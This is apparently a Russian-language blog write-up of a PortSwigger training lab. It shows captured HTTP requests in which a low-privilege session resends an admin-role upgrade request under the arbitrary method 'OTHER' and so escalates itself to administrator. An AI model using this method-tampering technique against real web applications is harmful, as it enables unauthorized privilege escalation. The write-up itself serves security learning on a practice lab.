---
title: "Method-based access control can be circumvented"
date: 2025-07-18
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented"
classes: wide
---

Известны креды от аккаунта администратора `administrator:admin`. Для решения нужно повысить свой аккаунт до администратора. Для входа можно использовать данные `wiener:peter`.

```
https://0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net/
```

## Solution

Итак, начну по порядку. Залогинюсь в личный кабинет админа, чтобы собрать пример запроса:

```http
POST /admin-roles HTTP/2
Host: 0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net
Cookie: session=pTr8IOmnMWU0CqHp6LIu9EYyhkkyWaS5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=carlos&action=upgrade
```

Пример собрали. Теперь возвращаюсь к жизни обычного смертного. Подставляю другое значение сессии, ибо и дурак сможет выполнять команды от лица админа) Подставлю свой логин в поле `username`. Как и ожидалось — запрет:

```http
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

Попробую изменить метод на `OTHER`:

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'username'"
```

А вот это уже интереснее:

```http
OTHER /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net
Cookie: session=LQVLBuPECrAuzyle1GdiH47BrNf1p8Nh
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net/admin
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: https://0a0f00da04e7a5ec8059a95d005600e3.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Ндаа...

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Я думал, что будет какой-нибудь специфичный метод. Или хотя бы `PUT`. Но лаба решена, чего жаловаться то?)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_access_control/IMG_Method-based_access_control_can_be_circumvented/1.png){: height="200" .align-center}